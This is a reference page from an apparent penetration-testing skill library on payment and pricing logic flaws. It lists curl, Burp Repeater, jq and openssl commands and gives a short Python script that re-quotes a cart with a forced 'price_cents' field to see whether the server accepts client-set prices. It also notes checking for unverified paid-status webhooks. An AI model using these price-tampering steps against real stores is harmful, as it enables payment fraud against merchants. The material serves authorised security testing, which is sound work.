# Tools, CLI Flags, and SDK Reference

> Sub-skill: [`business-logic-flaws-payment-and-pricing`](SKILL.md) | Family: **Web and Application**

Flags below are the ones this technique actually needs. Verify with `--help` on your installed version before relying on an exact spelling.

## Tool and Command Matrix

| Tool / Package | Verified Command or Entry Point | Purpose | Platforms |
|---|---|---|---|
| `curl` | `curl -sS -b jar.txt -X POST 'https://target.example/api/cart/quote' -d 'sku=SKU-1&quantity=1'` | Record the catalogue-derived amount the server returns before any field is forced | Cross-platform |
| `Burp Suite Repeater` | `Send the quote POST to Repeater and toggle price_cents / currency / discount_code` | Compare the authoritative amount with and without the forced pricing field | Cross-platform |
| `jq` | `jq ".amount_cents, .currency, .discount_cents" <(curl -sS https://target.example/api/quote)` | Extract the server-side amount fields so comparison is on the charge, not the cart UI | Cross-platform |
| `openssl` | `openssl dgst -sha256 -hmac '<shared-secret>' webhook-body.json` | Recompute the HMAC a gateway callback should carry to show the paid-status webhook is unverified | Cross-platform |

## Minimal Script Shape

A price-authority harness: it fetches the catalogue-derived amount, then re-quotes with a forced price field and reports whether the server honoured the client price.

```python
import json
import urllib.parse
import urllib.request

QUOTE = 'https://target.example/api/cart/quote'
AUTH = {'Cookie': 'session=<authorised-session>'}

def amount(params):
    body = urllib.parse.urlencode(params).encode()
    req = urllib.request.Request(QUOTE, data=body, method='POST', headers=AUTH)
    with urllib.request.urlopen(req, timeout=10) as r:
        return json.loads(r.read()).get('amount_cents')

catalogue = amount({'sku': 'SKU-1', 'qty': '1'})
forced = amount({'sku': 'SKU-1', 'qty': '1', 'price_cents': '1'})
print({'catalogue_amount': catalogue, 'forced_amount': forced,
       'price_is_client_authoritative': forced is not None and forced != catalogue})
```
